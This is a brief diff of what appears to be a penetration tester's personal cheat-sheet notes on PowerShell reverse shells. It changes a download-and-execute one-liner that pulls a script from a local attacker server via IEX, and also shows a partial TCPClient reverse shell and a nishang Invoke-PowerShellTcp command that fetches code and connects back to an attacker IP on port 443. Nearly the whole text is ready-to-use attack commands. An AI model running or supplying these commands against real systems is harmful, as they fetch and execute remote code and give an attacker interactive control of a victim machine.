@@ -8,7 +8,7 @@ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<p
 also saved in revsh2.ps1 on ny kali
 
 start from somewhere else:
-`powershell "IEX (New-Object Net.WebClient).DownloadString('http://10.18.21.236:8000/shells/revshk.ps1');"`
+`powershell "IEX (New-Object Net.WebClient).DownloadString('http://10.18.21.236:8000/shells/revsh2.ps1');"`
 
 [nishang](https://github.com/samratashok/nishang)
  `powershell iex (New-Object Net.WebClient).DownloadString('http://10.18.21.236:8000/shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.18.21.236 -Port 443`
